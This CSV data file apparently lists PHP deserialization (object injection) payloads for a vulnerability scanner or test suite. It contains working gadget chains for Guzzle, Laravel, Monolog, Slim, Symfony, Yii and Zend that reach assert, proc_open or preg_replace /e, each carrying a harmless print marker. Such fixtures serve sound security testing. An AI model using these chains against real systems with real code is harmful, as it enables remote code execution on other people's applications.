Payload1,Payload2
"O:18:\""PHPObjectInjection\"":1:{s:6:\""inject\"";s:16:\""print(\""UiPath\"");\"";}",UiPath
TzoxODoiUEhQT2JqZWN0SW5qZWN0aW9uIjoxOntzOjY6ImluamVjdCI7czoxNjoicHJpbnQoIlVpUGF0aCIpOyI7fQ==,UiPath
O%3A18%3A%22PHPObjectInjection%22%3A1%3A%7Bs%3A6%3A%22inject%22%3Bs%3A16%3A%22print%28%22UiPath%22%29%3B%22%3B%7D,UiPath
"O:24:""GuzzleHttp\Psr7\FnStream"":2:{s:33:""GuzzleHttp\Psr7\FnStreammethods"";a:1:{s:5:""close"";a:2:{i:0;O:23:""GuzzleHttp\HandlerStack"":3:{s:32:""GuzzleHttp\HandlerStackhandler"";s:16:""print(""UiPath"");"";s:30:""GuzzleHttp\HandlerStackstack"";a:1:{i:0;a:1:{i:0;s:6:""assert"";}}s:31:""GuzzleHttp\HandlerStackcached"";b:0;}i:1;s:7:""resolve"";}}s:9:""_fn_close"";a:2:{i:0;r:4;i:1;s:7:""resolve"";}}",UiPath
"O:40:""Illuminate\Broadcasting\PendingBroadcast"":2:{s:9:""*events"";O:15:""Faker\Generator"":1:{s:13:""*formatters"";a:1:{s:8:""dispatch"";s:6:""assert"";}}s:8:""*event"";s:16:""print(""UiPath"");"";}",UiPath
"O:40:""Illuminate\Broadcasting\PendingBroadcast"":2:{s:9:""*events"";O:28:""Illuminate\Events\Dispatcher"":1:{s:12:""*listeners"";a:1:{s:16:""print(""UiPath"");"";a:1:{i:0;s:6:""assert"";}}}s:8:""*event"";s:16:""print(""UiPath"");"";}",UiPath
"O:32:""Monolog\Handler\SyslogUdpHandler"":1:{s:9:""*socket"";O:29:""Monolog\Handler\BufferHandler"":7:{s:10:""*handler"";O:29:""Monolog\Handler\BufferHandler"":7:{s:10:""*handler"";N;s:13:""*bufferSize"";i:-1;s:9:""*buffer"";a:1:{i:0;a:2:{i:0;s:16:""print(""UiPath"");"";s:5:""level"";N;}}s:8:""*level"";N;s:14:""*initialized"";b:1;s:14:""*bufferLimit"";i:-1;s:13:""*processors"";a:2:{i:0;s:7:""current"";i:1;s:6:""assert"";}}s:13:""*bufferSize"";i:-1;s:9:""*buffer"";a:1:{i:0;a:2:{i:0;s:16:""print(""UiPath"");"";s:5:""level"";N;}}s:8:""*level"";N;s:14:""*initialized"";b:1;s:14:""*bufferLimit"";i:-1;s:13:""*processors"";a:2:{i:0;s:7:""current"";i:1;s:6:""assert"";}}}",UiPath
"O:32:""Monolog\Handler\SyslogUdpHandler"":1:{s:6:""socket"";O:29:""Monolog\Handler\BufferHandler"":7:{s:10:""*handler"";O:29:""Monolog\Handler\BufferHandler"":7:{s:10:""*handler"";N;s:13:""*bufferSize"";i:-1;s:9:""*buffer"";a:1:{i:0;a:2:{i:0;s:16:""print(""UiPath"");"";s:5:""level"";N;}}s:8:""*level"";N;s:14:""*initialized"";b:1;s:14:""*bufferLimit"";i:-1;s:13:""*processors"";a:2:{i:0;s:7:""current"";i:1;s:6:""assert"";}}s:13:""*bufferSize"";i:-1;s:9:""*buffer"";a:1:{i:0;a:2:{i:0;s:16:""print(""UiPath"");"";s:5:""level"";N;}}s:8:""*level"";N;s:14:""*initialized"";b:1;s:14:""*bufferLimit"";i:-1;s:13:""*processors"";a:2:{i:0;s:7:""current"";i:1;s:6:""assert"";}}}",UiPath
"O:18:""Slim\Http\Response"":2:{s:10:""*headers"";O:8:""Slim\App"":1:{s:19:""Slim\Appcontainer"";O:14:""Slim\Container"":3:{s:21:""Pimple\Containerraw"";a:1:{s:3:""all"";a:2:{i:0;O:8:""Slim\App"":1:{s:19:""Slim\Appcontainer"";O:8:""Slim\App"":1:{s:19:""Slim\Appcontainer"";O:14:""Slim\Container"":3:{s:21:""Pimple\Containerraw"";a:1:{s:3:""has"";s:6:""assert"";}s:24:""Pimple\Containervalues"";a:1:{s:3:""has"";s:6:""assert"";}s:22:""Pimple\Containerkeys"";a:1:{s:3:""has"";s:6:""assert"";}}}}i:1;s:16:""print(""UiPath"");"";}}s:24:""Pimple\Containervalues"";a:1:{s:3:""all"";a:2:{i:0;r:6;i:1;s:16:""print(""UiPath"");"";}}s:22:""Pimple\Containerkeys"";a:1:{s:3:""all"";a:2:{i:0;r:6;i:1;s:16:""print(""UiPath"");"";}}}}s:7:""*body"";s:0:"""";}",UiPath
"O:43:""Symfony\Component\Cache\Adapter\ApcuAdapter"":3:{s:64:""Symfony\Component\Cache\Adapter\AbstractAdaptermergeByLifetime"";s:9:""proc_open"";s:58:""Symfony\Component\Cache\Adapter\AbstractAdapternamespace"";a:0:{}s:57:""Symfony\Component\Cache\Adapter\AbstractAdapterdeferred"";s:16:""print(""UiPath"");"";}",UiPath
"O:11:""CDbCriteria"":1:{s:6:""params"";O:5:""CList"":1:{s:9:""CList_d"";O:10:""CFileCache"":7:{s:9:""keyPrefix"";s:0:"""";s:7:""hashKey"";b:0;s:10:""serializer"";a:1:{i:1;s:6:""assert"";}s:9:""cachePath"";s:10:""data:text/"";s:14:""directoryLevel"";i:0;s:11:""embedExpiry"";b:1;s:15:""cacheFileSuffix"";s:44:"";base64,OTk5OTk5OTk5OXByaW50KCJVaVBhdGgiKTs="";}}}",UiPath
"O:8:""Zend_Log"":1:{s:11:""*_writers"";a:1:{i:0;O:20:""Zend_Log_Writer_Mail"":5:{s:16:""*_eventsToMail"";a:1:{i:0;i:1;}s:22:""*_layoutEventsToMail"";a:0:{}s:8:""*_mail"";O:9:""Zend_Mail"":0:{}s:10:""*_layout"";O:11:""Zend_Layout"":3:{s:13:""*_inflector"";O:23:""Zend_Filter_PregReplace"":2:{s:16:""*_matchPattern"";s:7:""/(.*)/e"";s:15:""*_replacement"";s:16:""print(""UiPath"");"";}s:20:""*_inflectorEnabled"";b:1;s:10:""*_layout"";s:6:""layout"";}s:22:""*_subjectPrependText"";N;}}}",UiPath
,
,
,
,
,
